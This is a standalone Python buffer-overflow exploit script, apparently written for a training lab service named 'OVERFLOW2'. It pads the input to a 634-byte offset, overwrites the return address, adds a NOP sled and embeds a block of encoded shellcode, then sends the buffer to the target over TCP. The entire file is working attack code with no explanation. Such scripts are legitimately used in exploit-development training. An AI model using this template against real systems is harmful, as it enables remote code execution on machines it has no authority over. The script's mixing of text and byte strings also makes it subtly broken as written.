import socket

ip = "10.10.15.121"
port = 1337

prefix = "OVERFLOW2 "
offset = 634
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 20
payload =  b""
payload += b"\xfc\xbb\x0f\xdb\xf5\x24\xeb\x0c\x5e\x56\x31\x1e"
payload += b"\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff"
payload += b"\xff\xf3\x33\x77\x24\x0b\xc4\x18\xac\xee\xf5\x18"
payload += b"\xca\x7b\xa5\xa8\x98\x29\x4a\x42\xcc\xd9\xd9\x26"
payload += b"\xd9\xee\x6a\x8c\x3f\xc1\x6b\xbd\x7c\x40\xe8\xbc"
payload += b"\x50\xa2\xd1\x0e\xa5\xa3\x16\x72\x44\xf1\xcf\xf8"
payload += b"\xfb\xe5\x64\xb4\xc7\x8e\x37\x58\x40\x73\x8f\x5b"
payload += b"\x61\x22\x9b\x05\xa1\xc5\x48\x3e\xe8\xdd\x8d\x7b"
payload += b"\xa2\x56\x65\xf7\x35\xbe\xb7\xf8\x9a\xff\x77\x0b"
payload += b"\xe2\x38\xbf\xf4\x91\x30\xc3\x89\xa1\x87\xb9\x55"
payload += b"\x27\x13\x19\x1d\x9f\xff\x9b\xf2\x46\x74\x97\xbf"
payload += b"\x0d\xd2\xb4\x3e\xc1\x69\xc0\xcb\xe4\xbd\x40\x8f"
payload += b"\xc2\x19\x08\x4b\x6a\x38\xf4\x3a\x93\x5a\x57\xe2"
payload += b"\x31\x11\x7a\xf7\x4b\x78\x13\x34\x66\x82\xe3\x52"
payload += b"\xf1\xf1\xd1\xfd\xa9\x9d\x59\x75\x74\x5a\x9d\xac"
payload += b"\xc0\xf4\x60\x4f\x31\xdd\xa6\x1b\x61\x75\x0e\x24"
payload += b"\xea\x85\xaf\xf1\xbd\xd5\x1f\xaa\x7d\x85\xdf\x1a"
payload += b"\x16\xcf\xef\x45\x06\xf0\x25\xee\xad\x0b\xae\x1b"
payload += b"\x3b\x17\x03\x74\x39\x17\x7e\x98\xb4\xf1\xea\xb0"
payload += b"\x90\xaa\x82\x29\xb9\x20\x32\xb5\x17\x4d\x74\x3d"
payload += b"\x94\xb2\x3b\xb6\xd1\xa0\xac\x36\xac\x9a\x7b\x48"
payload += b"\x1a\xb2\xe0\xdb\xc1\x42\x6e\xc0\x5d\x15\x27\x36"
payload += b"\x94\xf3\xd5\x61\x0e\xe1\x27\xf7\x69\xa1\xf3\xc4"
payload += b"\x74\x28\x71\x70\x53\x3a\x4f\x79\xdf\x6e\x1f\x2c"
payload += b"\x89\xd8\xd9\x86\x7b\xb2\xb3\x75\xd2\x52\x45\xb6"
payload += b"\xe5\x24\x4a\x93\x93\xc8\xfb\x4a\xe2\xf7\x34\x1b"
payload += b"\xe2\x80\x28\xbb\x0d\x5b\xe9\xdb\xef\x49\x04\x74"
payload += b"\xb6\x18\xa5\x19\x49\xf7\xea\x27\xca\xfd\x92\xd3"
payload += b"\xd2\x74\x96\x98\x54\x65\xea\xb1\x30\x89\x59\xb1"
payload += b"\x10\x89\x5d\x4d\x9b"

postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")

